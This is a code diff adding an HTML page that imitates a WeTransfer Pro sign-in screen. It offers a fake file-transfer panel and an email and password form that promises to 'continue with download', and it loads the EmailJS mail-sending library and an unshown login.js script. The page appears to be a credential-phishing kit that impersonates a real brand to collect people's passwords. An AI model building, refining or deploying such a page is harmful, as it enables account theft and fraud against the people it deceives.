@@ -1,0 +1,251 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>WeTransfer Pro</title>
+    <!-- Tailwind CSS CDN -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <!-- Link to external CSS file -->
+    <link rel="stylesheet" href="css/login.css?v=3">
+
+    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+
+    <link rel="icon" type="image/jpeg" href="wt.jpg">
+
+</head>
+
+<body class="flex min-h-screen bg-gray-100">
+    <!-- Left Section: File Transfer -->
+    <div class="left-login-side flex">
+        <div class="relative flex-1 bg-yellow-200 flex items-center justify-center p-4 sm:p-6 md:p-8 lg:p-12">
+
+            <div class="absolute top-4 left-4 sm:top-6 sm:left-6 md:top-8 md:left-8">
+                <a href="index.html">
+                    <svg class="w-10 h-10 text-gray-700" fill="#000" viewBox="0" xmlns="http://www.w3.org/2000/svg">
+                        <path fill-rule="evenodd"
+                            d="M12.23 15.014c-.383-.605-.697-.926-1.254-.926-.558 0-.872.32-1.255.926L8.05 17.686c-.627 1.032-1.15 1.745-2.37 1.745s-1.777-.499-2.369-1.888a42.3 42.3 0 0 1-2.195-6.554C.348 7.89 0 5.967 0 4.4s.488-2.493 2.16-2.813c2.3-.428 5.401-.677 8.816-.677 3.414 0 6.515.25 8.815.677 1.672.32 2.16 1.246 2.16 2.814 0 1.567-.348 3.49-1.115 6.59a42.3 42.3 0 0 1-2.195 6.553c-.592 1.39-1.15 1.888-2.37 1.888-1.219 0-1.741-.713-2.369-1.745zm26.516 2.5c-1.185 1.282-3.415 2.208-6.342 2.208-5.888 0-9.373-4.096-9.373-9.474 0-5.77 4.007-9.19 9.199-9.19 4.634 0 7.7 2.458 7.7 5.77 0 3.135-2.613 5.165-5.575 5.165-1.602 0-2.787-.32-3.588-.961-.314-.25-.488-.214-.488.071 0 1.175.418 2.173 1.184 2.956.628.641 1.812 1.069 2.927 1.069 1.15 0 2.16-.25 3.066-.713s1.673-.32 2.126.428c.523.855-.21 1.959-.836 2.671"
+                            clip-rule="evenodd"></path>
+                    </svg>
+                </a>
+            </div>
+
+            <div class="w-full max-w-sm bg-white rounded-xl shadow-lg p-4 sm:p-6 md:p-8 space-y-4">
+                <!-- Add your files box -->
+                <div
+                    class="border-2 border-dashed border-blue-300 bg-blue-50 text-blue-600 rounded-lg p-4 text-center cursor-pointer hover:bg-blue-100 transition-colors">
+                    <div class="flex items-center justify-center text-lg font-medium">
+                        <span class="plus-icon"></span>
+                        Add your files
+                    </div>
+                    <div class="text-sm mt-1">Or select a folder</div>
+                </div>
+
+
+                <!-- Input fields -->
+                <input type="email" placeholder="Email to"
+                    class="w-full p-3 border-up  focus:outline-none focus:ring-2 focus:ring-blue-500">
+                <input type="email" placeholder="Your email"
+                    class="w-full p-3  border-up focus:outline-none focus:ring-2 focus:ring-blue-500">
+                <textarea placeholder="Message" rows="3"
+                    class="w-full p-3  border-up border-down resize-none focus:outline-none focus:ring-2 focus:ring-blue-500"></textarea>
+
+                <!-- Transfer button and options -->
+                <div class="flex items-center justify-between pt-2">
+                    <button class="bg-gray-200 text-gray-600 rounded-full p-2 hover:bg-gray-300 transition-colors">
+                        <span class="three-dots-icon">
+                            <span class="three-dots-icon-middle"></span>
+                        </span>
+                    </button>
+                    <a href="login.html">
+                        <button
+                            class="bg-blue-500 text-white font-semibold py-3 px-8 rounded-full shadow-md hover:bg-blue-600 transition-colors">
+                            Transfer
+                        </button>
+                    </a>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Right Section: Login/Signup & Marketing -->
+    <div class="relative flex-1 bg-white flex flex-col p-4 sm:p-6 md:p-8 lg:p-12 overflow-y-auto">
+
+        <!-- Top Navigation -->
+        <div class="login-nav">
+            <nav class="flex justify-end space-x-4 text-gray-600 text-sm mb-8">
+                <a href="#" class="hover:text-blue-500 transition-colors">Help</a>
+                <a href="#" class="hover:text-blue-500 transition-colors">About</a>
+                <a href="#" class="font-semibold hover:text-blue-500 transition-colors">Sign up</a>
+                <a href="#" class="font-semibold hover:text-blue-500 transition-colors">Log in</a>
+            </nav>
+        </div>
+        <div class="marketing-content-mobile">
+            <div class="flex items-center space-x-2 pb-7"><a href="index.html">
+                    <svg class="w-10 h-5 text-gray-700" fill="#000" viewBox="0" xmlns="http://www.w3.org/2000/svg">
+                        <path fill-rule="evenodd"
+                            d="M12.23 15.014c-.383-.605-.697-.926-1.254-.926-.558 0-.872.32-1.255.926L8.05 17.686c-.627 1.032-1.15 1.745-2.37 1.745s-1.777-.499-2.369-1.888a42.3 42.3 0 0 1-2.195-6.554C.348 7.89 0 5.967 0 4.4s.488-2.493 2.16-2.813c2.3-.428 5.401-.677 8.816-.677 3.414 0 6.515.25 8.815.677 1.672.32 2.16 1.246 2.16 2.814 0 1.567-.348 3.49-1.115 6.59a42.3 42.3 0 0 1-2.195 6.553c-.592 1.39-1.15 1.888-2.37 1.888-1.219 0-1.741-.713-2.369-1.745zm26.516 2.5c-1.185 1.282-3.415 2.208-6.342 2.208-5.888 0-9.373-4.096-9.373-9.474 0-5.77 4.007-9.19 9.199-9.19 4.634 0 7.7 2.458 7.7 5.77 0 3.135-2.613 5.165-5.575 5.165-1.602 0-2.787-.32-3.588-.961-.314-.25-.488-.214-.488.071 0 1.175.418 2.173 1.184 2.956.628.641 1.812 1.069 2.927 1.069 1.15 0 2.16-.25 3.066-.713s1.673-.32 2.126.428c.523.855-.21 1.959-.836 2.671"
+                            clip-rule="evenodd"></path>
+                    </svg>
+                </a></div>
+            <div class="w-full max-w-3xl mx-auto text-center flex-grow flex flex-col justify-center">
+                <h1 class="text-5xl sm:text-6xl md:text-7xl font-bold text-gray-800 mb-4 tracking-tight">
+                    <a href="index.html">
+                        <center><img src="img/wetransfer.svg" alt="WeTransfer" width="160" style="padding-bottom: 2px;">
+                        </center>
+                        <!-- <span style="font-family: ui-rounded;">WeTransfer Pro</span> -->
+                    </a>
+                </h1>
+                <strong class="text-xl">Sign In</strong>
+                <p class="sm:text-2xl" style="font-size: 15px;">to continue to your WeTransfer account
+                </p>
+            </div>
+        </div>
+
+        <!-- Login Form -->
+        <form id="loginForm">
+            <div class="w-full max-w-3xl mx-auto mb-16">
+                <div class="items-center space-y-4 aut-message">
+                    <!-- Error message when login fails -->
+                    <div class="error-message" id="errorMessage">Error! Retry login</div>
+                    <!-- Message when login works -->
+                    <div class="login-message" id="loginMessage">Please wait, loading...</div>
+                </div>
+                <div class="flex flex-col sm:flex-row items-center space-y-4 sm:space-y-0 sm:space-x-4 mb-4">
+                    <input type="email" id="email" name="email" placeholder="Email address" required
+                        class="flex-1 w-full sm:w-auto p-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500">
+                    <input type="password" id="password" name="password" placeholder="Password" required
+                        class="flex-1 w-full sm:w-auto p-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500">
+                    <div class="login-btn">
+                        <button type="submit"
+                            class="w-full sm:w-auto bg-gray-400 text-white py-3 px-6 rounded-lg shadow-sm hover:bg-gray-400 transition-colors">
+                            Submit
+                        </button>
+                    </div>
+                    <div class="mobile-login-btn w-full">
+                        <button type="submit"
+                            class="w-full sm:w-auto bg-blue-500 text-white py-3 px-6 rounded-lg shadow-sm hover:bg-gray-400 transition-colors">
+                            Continue with download
+                        </button>
+                    </div>
+                </div>
+                <div class="login-option">
+                    <div class="flex items-center text-sm text-gray-600">
+                        <input type="checkbox" id="rememberMe" class="mr-2 rounded text-blue-500 focus:ring-blue-500">
+                        <label for="rememberMe" class="mr-4">Remember me</label>
+                        <a href="#" class="text-blue-500 hover:underline">Forgot password?</a>
+                    </div>
+                </div>
+                <div class="mobile-login-option">
+                    <center>
+                        <a href="#" class="text-gray-600 underline">Forgot password?</a><br />
+                        <a href="#" class="text-gray-600 underline">Use a different password?</a>
+                    </center>
+                </div>
+            </div>
+        </form>
+
+        <!-- WeTransfer Pro Marketing Content -->
+        <div class="marketing-content">
+            <div class="w-full max-w-3xl mx-auto text-center flex-grow flex flex-col justify-center">
+                <h1 class="text-5xl sm:text-6xl md:text-7xl font-bold text-gray-800 mb-4 tracking-tight">
+                    <span style="font-family: ui-rounded;">WeTransfer Pro</span>
+                </h1>
+                <p class="text-xl sm:text-2xl text-gray-600 mb-12">
+                    Get more out of WeTransfer, get Pro
+                </p>
+
+                <div class="grid grid-cols-1 md:grid-cols-2 gap-8 text-left mb-12">
+                    <div>
+                        <h3 class="text-lg font-semibold text-gray-800 mb-3">A better service</h3>
+                        <ul class="space-y-2 text-gray-600">
+                            <li class="flex items-center">
+                                <svg class="w-5 h-5 text-green-500 mr-2" fill="none" stroke="currentColor"
+                                    viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
+                                        d="M5 13l4 4L19 7"></path>
+                                </svg>
+                                Send up to 20GB at a time
+                            </li>
+                            <li class="flex items-center">
+                                <svg class="w-5 h-5 text-green-500 mr-2" fill="none" stroke="currentColor"
+                                    viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
+                                        d="M5 13l4 4L19 7"></path>
+                                </svg>
+                                Store up to 1 TB
+                            </li>
+                            <li class="flex items-center">
+                                <svg class="w-5 h-5 text-green-500 mr-2" fill="none" stroke="currentColor"
+                                    viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
+                                        d="M5 13l4 4L19 7"></path>
+                                </svg>
+                                Password protect your files
+                            </li>
+                        </ul>
+                    </div>
+                    <div>
+                        <h3 class="text-lg font-semibold text-gray-800 mb-3">Your own look and feel</h3>
+                        <ul class="space-y-2 text-gray-600">
+                            <li class="flex items-center">
+                                <svg class="w-5 h-5 text-green-500 mr-2" fill="none" stroke="currentColor"
+                                    viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
+                                        d="M5 13l4 4L19 7"></path>
+                                </svg>
+                                Personalize your profile
+                            </li>
+                            <li class="flex items-center">
+                                <svg class="w-5 h-5 text-green-500 mr-2" fill="none" stroke="currentColor"
+                                    viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
+                                        d="M5 13l4 4L19 7"></path>
+                                </svg>
+                                Add background video or images
+                            </li>
+                            <li class="flex items-center">
+                                <svg class="w-5 h-5 text-green-500 mr-2" fill="none" stroke="currentColor"
+                                    viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
+                                        d="M5 13l4 4L19 7"></path>
+                                </svg>
+                                Customize your emails
+                            </li>
+                        </ul>
+                    </div>
+                </div>
+
+                <div class="flex flex-col sm:flex-row justify-center space-y-4 sm:space-y-0 sm:space-x-4">
+                    <button
+                        class="bg-white border border-blue-500 text-blue-500 font-semibold py-3 px-8 rounded-full shadow-md hover:bg-blue-50 transition-colors">
+                        More about WeTransfer Pro
+                    </button>
+                    <button
+                        class="bg-blue-500 text-white font-semibold py-3 px-8 rounded-full shadow-md hover:bg-blue-600 transition-colors">
+                        Sign me up
+                    </button>
+                </div>
+            </div>
+        </div>
+</body>
+<!-- Footer -->
+<div class="footer">
+    <footer
+        class="flex justify-between items-center px-6 py-3 bg-white shadow-sm border-t border-gray-200 text-sm text-gray-500">
+        <div class="flex items-center space-x-2">
+            &copy;2025 WeTransfer
+        </div>
+        <div class="flex items-center space-x-4">
+            <a href="/privacy" class="hover:text-gray-700">Privacy</a>
+            <span>|</span>
+            <a href="/terms" class="hover:text-gray-700">Terms</a>
+        </div>
+    </footer>
+</div>
+<!-- Link to external JavaScript file -->
+<script src="login.js"></script>
+
+</html>
